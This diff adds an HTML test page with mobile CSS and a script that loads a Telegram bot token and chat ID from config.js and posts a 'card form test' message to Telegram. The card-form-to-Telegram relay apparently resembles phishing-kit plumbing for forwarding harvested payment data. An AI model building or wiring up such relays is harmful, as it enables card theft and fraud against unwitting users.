@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Config</title>
+    <script src="config.js"></script>
+    <style>
+        /* ===== OPTIMISATIONS MOBILE ===== */
+        * {
+            box-sizing: border-box;
+        }
+        
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Responsive text */
+        @media (max-width: 768px) {
+            body {
+                font-size: 14px;
+                line-height: 1.5;
+            }
+            
+            h1, .h1 { font-size: 20px !important; }
+            h2, .h2 { font-size: 18px !important; }
+            h3, .h3 { font-size: 16px !important; }
+            
+            /* Buttons */
+            button, .btn, [class*="btn"] {
+                min-height: 44px;
+                padding: 12px 20px !important;
+                font-size: 14px;
+            }
+            
+            /* Inputs */
+            input, select, textarea {
+                min-height: 44px;
+                padding: 12px;
+                font-size: 16px;
+            }
+            
+            /* Layout */
+            .container, main, section {
+                padding: 15px !important;
+            }
+            
+            /* Grid adjustments */
+            [class*="grid"], [class*="flex"] {
+                flex-direction: column;
+            }
+            
+            /* Hide unnecessary elements */
+            .hide-mobile {
+                display: none !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1, .h1 { font-size: 18px !important; }
+            h2, .h2 { font-size: 16px !important; }
+            h3, .h3 { font-size: 14px !important; }
+            
+            button, .btn, [class*="btn"] {
+                width: 100%;
+                padding: 14px 16px !important;
+                font-size: 13px;
+            }
+            
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            .container, main, section {
+                padding: 10px !important;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <h1>Test Token Telegram</h1>
+    <pre id="result"></pre>
+    <script>
+        window.addEventListener('load', () => {
+            const result = document.getElementById('result');
+            result.innerHTML = JSON.stringify(window.telegramConfig, null, 2);
+            console.log('Config:', window.telegramConfig);
+            
+            // Test envoi Telegram
+            if (window.telegramConfig && window.telegramConfig.BOT_TOKEN) {
+                fetch('https://api.telegram.org/bot' + window.telegramConfig.BOT_TOKEN + '/sendMessage', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: window.telegramConfig.CHAT_ID,
+                        text: 'Test du formulaire de cartes'
+                    })
+                }).then(r => r.json()).then(d => {
+                    result.innerHTML += '\n\nRéponse Telegram:\n' + JSON.stringify(d, null, 2);
+                }).catch(e => {
+                    result.innerHTML += '\n\nErreur:\n' + e.message;
+                });
+            } else {
+                result.innerHTML += '\n\n⚠️ BOT_TOKEN vide ou config.js non chargé!';
+            }
+        });
+    </script>
+</body>
+</html>
